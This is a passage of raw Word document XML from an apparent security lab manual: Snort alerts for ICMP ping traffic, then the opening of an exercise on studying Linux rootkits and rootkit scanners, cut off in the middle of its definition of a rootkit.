      </w:r>
      <w:r>
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>y:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>0]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>06-15</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>03</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>12.189727</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>192.168.43.148 -&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>106.10.138.240</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="3424"/>
      </w:pPr>
      <w:r>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:t>MP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>TL:</w:t>
      </w:r>
      <w:r>
        <w:t>64</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-7"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>OS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>0x0 ID</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>46238 Ip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>20 Dg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mL</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">84 DF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-19"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>yp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>8  Cod</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">0 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ID</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>14680   Seq</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">65  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>CHO</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="6090"/>
      </w:pPr>
      <w:r>
        <w:t>[**] [1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>477</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>3] ICMP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Pack</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>[**] [Pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>y:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>0]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>06-15</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>03</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>12.340881</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>106.10.138.240 -&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>192.168.43.148</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:t>MP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>TL:</w:t>
      </w:r>
      <w:r>
        <w:t>52</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-7"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>OS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>0x38 ID</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>7545 Ip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>20 Dg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mL</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>84</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-19"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>yp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>0  Cod</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">0 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ID</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>14680  Seq</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">65  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>CHO R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-24"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t>Y</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1380" w:bottom="280" w:left="114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604" w:right="1375" w:hanging="3504"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Ex. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">o.: 16a                                                                                                         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="54"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ate: S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UDY</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>OO</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ITS</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02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020" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="2" w:space="720" w:equalWidth="0">
            <w:col w:w="620" w:space="190"/>
            <w:col w:w="8930"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-17"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>o s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>udy about</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>s and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>erent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>s scanner</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>Li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>nux.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="100" w:right="8339"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>sc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>pt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>on:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="70" w:firstLine="710"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>A roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>program</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>na</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>several</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>progra</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>s)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>des</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gned</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ake</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>funda</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>al con</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>rol</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Un</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>“roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>access,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ndo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
